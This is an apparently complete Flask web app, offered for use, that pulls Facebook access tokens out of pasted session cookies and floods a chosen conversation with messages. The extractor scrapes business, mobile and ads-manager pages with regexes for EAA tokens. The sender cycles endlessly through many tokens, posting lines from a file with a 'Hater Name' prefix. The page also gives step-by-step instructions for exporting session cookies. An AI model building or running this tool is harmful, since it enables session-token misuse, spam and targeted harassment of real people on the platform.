from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import re
import json

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def parse_cookie_input(cookie_input):
    """Parse cookie input in either JSON or string format"""
    try:
        # Try to parse as JSON
        cookie_json = json.loads(cookie_input)
        cookies = {}
        for cookie in cookie_json:
            if 'name' in cookie and 'value' in cookie:
                cookies[cookie['name']] = cookie['value']
        return cookies
    except json.JSONDecodeError:
        # Parse as string format "name=value; name2=value2"
        cookies = {}
        for item in cookie_input.split(';'):
            if '=' in item:
                name, value = item.strip().split('=', 1)
                cookies[name.strip()] = value.strip()
        return cookies

def extract_token_from_cookie(cookie_input):
    """Extract Facebook access token from cookie"""
    try:
        cookies = parse_cookie_input(cookie_input)
        session = requests.Session()
        
        # Set all cookies
        for name, value in cookies.items():
            session.cookies.set(name, value, domain='.facebook.com')
        
        # Check if we have essential cookies
        if 'c_user' not in cookies:
            return None, "Missing c_user cookie. Make sure you're logged into Facebook."
        
        c_user = cookies.get('c_user')
        xs = cookies.get('xs', '')
        
        headers_fb = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        tokens_found = []
        
        # Method 1: Try business.facebook.com
        try:
            response = session.get('https://business.facebook.com/business_locations', 
                                 headers=headers_fb, timeout=15)
            
            # Look for EAA token
            ea_patterns = [
                r'EAA[A-Za-z0-9]{150,}',
                r'EAAB[A-Za-z0-9]{150,}',
                r'EAAC[A-Za-z0-9]{150,}',
                r'EAAD[A-Za-z0-9]{150,}',
                r'EAA[A-Za-z0-9]{200,}'
            ]
            
            for pattern in ea_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 100 and match not in tokens_found:
                        tokens_found.append(match)
            
            # Look for access_token in JSON
            json_patterns = [
                r'"accessToken"\s*:\s*"([^"]+)"',
                r'"access_token"\s*:\s*"([^"]+)"',
                r'accessToken=([^&\s]+)',
                r'access_token=([^&\s]+)'
            ]
            
            for pattern in json_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 100 and 'EAA' in match and match not in tokens_found:
                        tokens_found.append(match)
                        
        except Exception as e:
            print(f"Method 1 failed: {e}")
        
        # Method 2: Try graph.facebook.com
        try:
            response = session.get('https://graph.facebook.com/me?fields=id,name', 
                                 headers=headers_fb, timeout=15)
            if response.status_code == 200:
                data = response.json()
                if 'id' in data:
                    tokens_found.append(f"Session Valid for User ID: {data['id']} - Use full cookie for requests")
        except Exception as e:
            print(f"Method 2 failed: {e}")
        
        # Method 3: Try m.facebook.com
        try:
            response = session.get('https://m.facebook.com/', headers=headers_fb, timeout=15)
            
            ea_patterns = [
                r'EAA[A-Za-z0-9]{150,}',
                r'EAAB[A-Za-z0-9]{150,}',
                r'access_token[=:]\s*["\']?([E][A][A][A-Za-z0-9]+)["\']?'
            ]
            
            for pattern in ea_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    if len(match) > 100 and match not in tokens_found:
                        tokens_found.append(match)
                        
        except Exception as e:
            print(f"Method 3 failed: {e}")
        
        # Method 4: Try to get token from ads manager
        try:
            response = session.get('https://www.facebook.com/adsmanager/account_settings/information',
                                 headers=headers_fb, timeout=15)
            
            ea_patterns = [
                r'EAA[A-Za-z0-9]{150,}',
                r'EAAB[A-Za-z0-9]{150,}'
            ]
            
            for pattern in ea_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 100 and match not in tokens_found:
                        tokens_found.append(match)
                        
        except Exception as e:
            print(f"Method 4 failed: {e}")
        
        if tokens_found:
            return tokens_found[0], None
        else:
            return None, "No token found. Try logging in again or use different cookies."
            
    except Exception as e:
        return None, f"Error: {str(e)}"

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        print(f"Message Sent Successfully From token {access_token[:20]}...: {message}")
                    else:
                        print(f"Message Sent Failed From token {access_token[:20]}...: {response.status_code}")
                except Exception as e:
                    print(f"Error sending message: {e}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    extraction_success = False
    extraction_error = None
    extracted_token = None
    task_started = False
    task_id = None
    stop_success = False
    stopped_task_id = None
    
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'extract_token':
            cookie_string = request.form.get('cookieString')
            if cookie_string:
                token, error = extract_token_from_cookie(cookie_string)
                if token:
                    extraction_success = True
                    extracted_token = token
                else:
                    extraction_error = error
        
        elif action == 'send_messages':
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                single_token = request.form.get('singleToken')
                if single_token:
                    access_tokens = [single_token]
                else:
                    access_tokens = []
            else:
                if 'tokenFile' in request.files:
                    token_file = request.files['tokenFile']
                    if token_file.filename:
                        access_tokens = token_file.read().decode().strip().splitlines()
                    else:
                        access_tokens = []
                else:
                    access_tokens = []
            
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time', 1))
            
            if 'txtFile' in request.files:
                txt_file = request.files['txtFile']
                if txt_file.filename:
                    messages = txt_file.read().decode().splitlines()
                else:
                    messages = []
            else:
                messages = []
            
            if access_tokens and thread_id and messages:
                task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                stop_events[task_id] = Event()
                thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
                threads[task_id] = thread
                thread.start()
                task_started = True
    
    return render_template_string(HTML_TEMPLATE,
                                extraction_success=extraction_success,
                                extraction_error=extraction_error,
                                extracted_token=extracted_token,
                                task_started=task_started,
                                task_id=task_id,
                                stop_success=stop_success,
                                stopped_task_id=stopped_task_id)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    stop_success = False
    stopped_task_id = None
    
    if task_id in stop_events:
        stop_events[task_id].set()
        stop_success = True
        stopped_task_id = task_id
    
    return render_template_string(HTML_TEMPLATE,
                                extraction_success=False,
                                extraction_error=None,
                                extracted_token=None,
                                task_started=False,
                                task_id=None,
                                stop_success=stop_success,
                                stopped_task_id=stopped_task_id)

# HTML Template with improved cookie input instructions
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>👀AHMAD ALI SAFDAR🌀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
    }
    .container {
      max-width: 500px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      box-shadow: 0 0 15px white;
      border: none;
      background: rgba(0, 0, 0, 0.7);
      margin-bottom: 20px;
    }
    .form-control, .form-select {
      outline: 1px red;
      border: 1px double white;
      background: rgba(255, 255, 255, 0.1);
      width: 100%;
      padding: 7px;
      margin-bottom: 15px;
      border-radius: 10px;
      color: white;
    }
    .form-control:focus {
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }
    select option {
      background: #333;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
    .nav-tabs { border-bottom: 2px solid #007bff; }
    .nav-tabs .nav-link {
      color: white;
      border: none;
      font-weight: bold;
    }
    .nav-tabs .nav-link.active {
      background: #007bff;
      color: white;
      border-radius: 10px 10px 0 0;
    }
    .alert {
      border-radius: 10px;
      margin-top: 10px;
    }
    textarea.form-control {
      min-height: 120px;
      font-family: monospace;
      font-size: 12px;
    }
    .btn-copy {
      margin-left: 10px;
      padding: 2px 10px;
    }
    .token-box {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 5px;
      word-break: break-all;
      font-family: monospace;
      font-size: 12px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">♛♥彡𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝚰♛♥☨</h1>
  </header>
  
  <div class="container">
    <ul class="nav nav-tabs mb-3" id="myTab" role="tablist">
      <li class="nav-item" role="presentation">
        <button class="nav-link active" id="message-tab" data-bs-toggle="tab" data-bs-target="#message" type="button" role="tab">Message Sender</button>
      </li>
      <li class="nav-item" role="presentation">
        <button class="nav-link" id="token-tab" data-bs-toggle="tab" data-bs-target="#token" type="button" role="tab">Token Extractor</button>
      </li>
    </ul>
    
    <div class="tab-content">
      <!-- Message Sender Tab -->
      <div class="tab-pane fade show active" id="message" role="tabpanel">
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="action" value="send_messages">
          
          <div class="mb-3">
            <label for="tokenOption" class="form-label">Select Token Option</label>
            <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
              <option value="single">Single Token</option>
              <option value="multiple">Token File</option>
            </select>
          </div>
          
          <div class="mb-3" id="singleTokenInput">
            <label for="singleToken" class="form-label">Enter Single Token</label>
            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA...">
          </div>
          
          <div class="mb-3" id="tokenFileInput" style="display: none;">
            <label for="tokenFile" class="form-label">Choose Token File</label>
            <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          
          <div class="mb-3">
            <label for="kidx" class="form-label">Enter Your Hater Name</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          
          <div class="mb-3">
            <label for="time" class="form-label">Enter Time (seconds)</label>
            <input type="number" class="form-control" id="time" name="time" value="1" required>
          </div>
          
          <div class="mb-3">
            <label for="txtFile" class="form-label">Choose Your Np File</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">Run Message Sender</button>
        </form>
        
        {% if task_started %}
        <div class="alert alert-success mt-3">
          <strong>Success!</strong> Task started with ID: <code>{{ task_id }}</code>
        </div>
        {% endif %}
        
        <form method="post" action="/stop" class="mt-3">
          <div class="mb-3">
            <label for="taskId" class="form-label">Enter Task ID to Stop</label>
            <input type="text" class="form-control" id="taskId" name="taskId" required>
          </div>
          <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
        </form>
        
        {% if stop_success %}
        <div class="alert alert-warning mt-3">
          Task with ID <code>{{ stopped_task_id }}</code> has been stopped.
        </div>
        {% endif %}
      </div>
      
      <!-- Token Extractor Tab -->
      <div class="tab-pane fade" id="token" role="tabpanel">
        <form method="post">
          <input type="hidden" name="action" value="extract_token">
          
          <div class="mb-3">
            <label for="cookieString" class="form-label">Paste Facebook Cookie (JSON or String Format)</label>
            <textarea class="form-control" id="cookieString" name="cookieString" rows="8" placeholder='Paste your Facebook cookie here (JSON format from EditThisCookie or raw cookie string)...'></textarea>
          </div>
          
          <button type="submit" class="btn btn-success btn-submit">
            <i class="fas fa-key"></i> Extract Token
          </button>
        </form>
        
        {% if extraction_success %}
        <div class="alert alert-success mt-3">
          <strong>Token Extracted Successfully!</strong><br>
          <div class="token-box">
            <code id="extractedToken">{{ extracted_token }}</code>
          </div>
          <button class="btn btn-sm btn-info mt-2" onclick="copyToken()">
            <i class="fas fa-copy"></i> Copy Token
          </button>
        </div>
        {% endif %}
        
        {% if extraction_error %}
        <div class="alert alert-danger mt-3">
          <strong>Error!</strong> {{ extraction_error }}
        </div>
        {% endif %}
        
        <div class="alert alert-info mt-3">
          <strong>📌 How to get Facebook Cookie:</strong><br>
          <strong>Method 1 (Recommended):</strong><br>
          1. Install "EditThisCookie" Chrome extension<br>
          2. Login to Facebook<br>
          3. Click EditThisCookie icon<br>
          4. Click Export button (📤)<br>
          5. Paste the JSON data here<br><br>
          
          <strong>Method 2 (Manual):</strong><br>
          1. Login to Facebook<br>
          2. Press F12 (Developer Tools)<br>
          3. Go to Application/Storage tab<br>
          4. Click Cookies > https://www.facebook.com<br>
          5. Copy values manually or use console command:<br>
          <code>document.cookie</code>
        </div>
      </div>
    </div>
  </div>
  
  <footer class="footer">
    <p>© 2024 ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ🥀✌️ᴀʜᴍᴀᴅ.ᴋɪɴɢ😈🐧</p>
    <p> 𝐀𝐇𝐌𝐀𝐃 𝐊𝚰𝐍𝐆 𝐇𝐄𝐑𝐄<a href="https://www.facebook.com/ahmadali.safdar.52?mibextid=ZbWKwL">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923324661564" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    function copyToken() {
      var tokenText = document.getElementById('extractedToken').innerText;
      navigator.clipboard.writeText(tokenText).then(function() {
        alert('Token copied to clipboard!');
      });
    }
    
    // Auto-detect tab from URL hash
    if (window.location.hash === '#token') {
      var tokenTab = document.getElementById('token-tab');
      var bsTab = new bootstrap.Tab(tokenTab);
      bsTab.show();
    }
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
